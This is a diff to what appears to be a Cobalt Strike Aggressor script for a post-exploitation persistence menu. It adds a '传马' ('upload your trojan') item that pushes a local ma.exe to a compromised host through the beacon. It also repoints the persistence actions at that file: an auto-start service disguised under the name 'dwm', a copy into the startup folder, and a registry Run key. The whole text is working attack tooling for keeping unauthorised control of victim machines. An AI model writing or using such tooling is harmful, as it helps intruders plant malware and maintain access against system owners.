@@ -47,10 +47,23 @@ menu "权限维持" {
   }
 
   menu "自启动运行" {
+    item "传马" {
+      $bid = $1;
+      $dialog = dialog("上传你的马", %(FileName => "/Users/zjun/Downloads/ma.exe", UploadPath => "C:\\Users\\Public\\", bid => $bid), &upload);
+      dialog_description($dialog, "上传你的马");
+      drow_text($dialog, "FileName",  "本地路径: ");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub upload {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, $3['FileName']);
+      }
     menu "自启动服务" {
       item "创建自启动服务" {
         $bid = $1['@'];
-        $dialog = dialog("创建自启动服务", %(service => "dwm", program => "C:\\Windows\\Temp\\start.exe", bid => $bid), &auto);
+        $dialog = dialog("创建自启动服务", %(service => "dwm", program => "C:\\Users\\Public\\ma.exe", bid => $bid), &auto);
         drow_text($dialog, "service", "创建服务名: ");
         drow_text($dialog, "program", "程序路径: ");
         dialog_description($dialog, "添加服务自动运行。");
@@ -78,7 +91,7 @@ menu "权限维持" {
     menu "启动文件夹" {
       item "复制至启动文件夹" {
         $bid = $1['@'];
-        $dialog = dialog("复制至启动文件夹", %(program => "C:\\Windows\\Temp\\start.exe", user => "administrator", bid => $bid), &auto);
+        $dialog = dialog("复制至启动文件夹", %(program => "C:\\Users\\Public\\ma.exe", user => "administrator", bid => $bid), &auto);
         drow_text($dialog, "program", "程序路径: ");
         drow_text($dialog, "user", "用户名: ");
         dialog_description($dialog, "复制至启动文件夹。");
@@ -106,7 +119,7 @@ menu "权限维持" {
     menu "添加注册表实现自启动" {
       item "添加注册表实现自启动" {
         $bid = $1['@'];
-        $dialog = dialog("添加注册表实现自启动", %(program => "C:\\Windows\\Temp\\start.exe", name =>"start", bid => $bid), &auto);
+        $dialog = dialog("添加注册表实现自启动", %(program => "C:\\Users\\Public\\ma.exe", name =>"start", bid => $bid), &auto);
         drow_text($dialog, "program", "程序路径: ");
         drow_text($dialog, "name", "名称: ");
         dialog_description($dialog, "添加注册表实现自启动。");
